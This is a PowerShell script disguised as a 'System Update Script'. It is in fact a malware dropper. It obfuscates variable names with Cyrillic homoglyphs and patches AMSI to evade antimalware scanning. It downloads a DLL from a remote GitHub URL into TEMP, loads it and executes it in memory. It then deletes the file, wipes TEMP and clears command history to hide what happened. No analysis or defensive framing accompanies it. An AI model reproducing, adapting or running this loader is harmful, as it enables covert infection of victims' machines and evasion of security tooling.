# ============================================
# System Update Script - Looks completely innocent
# ============================================

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Cyrillic homoglyph obfuscation
${env:Темп} = ${env:TEMP}
$G = $null

function C {
    Remove-Item ${env:Темп}\* -Recurse -Force -EA SilentlyContinue
    $HistoryPath = $null; Clear-History -EA SilentlyContinue
    [GC]::Collect(); [GC]::WaitForPendingFinalizers()
}

# AMSI bypass
try {
    $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -cmatch "Utils" }
    $b = $a[0].GetFields('NonPublic,Static') | Where-Object { $_.Name -cmatch "Init" }
    $b[0].SetValue($null, [byte[]]([byte]0xB8,0x57,0x00,0x07,0x80,0xC3))
} catch {}

# Download and load DLL
try {
    $р = "$(${env:Темп})\$([Guid]::NewGuid().ToString().Substring(0,8)).dll"
    $Иет = New-Object System.Net.WebClient
    $дл = $Иет.DownloadData('https://github.com/angelsegg/gfddhd/raw/refs/heads/main/Final.dll')
    $Иет.Dispose()
    
    [System.IO.File]::WriteAllBytes($р, $дл)
    
    $ч = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Add-Type -member "[DllImport('kernel32.dll')]public static extern IntPtr LoadLibrary(string p);" -Name Л -Pass | % { [Л]::LoadLibrary($р) }),
        (Add-Type -member "[UnmanagedFunctionPointer(CallingConvention.Cdecl)]public delegate bool Start();public static Start s;" -Name С -Pass | % { $_.s })
    )
    
    & $ч
    
    $дл = $null; $ч = $null; $Иет = $null
    Start-Sleep -Seconds 2
    
    if (Test-Path $р) { Remove-Item $р -Force }
    
    C
    exit 0
    
} catch {
    if ($р -and (Test-Path $р)) { Remove-Item $р -Force }
    C
    exit 1
}
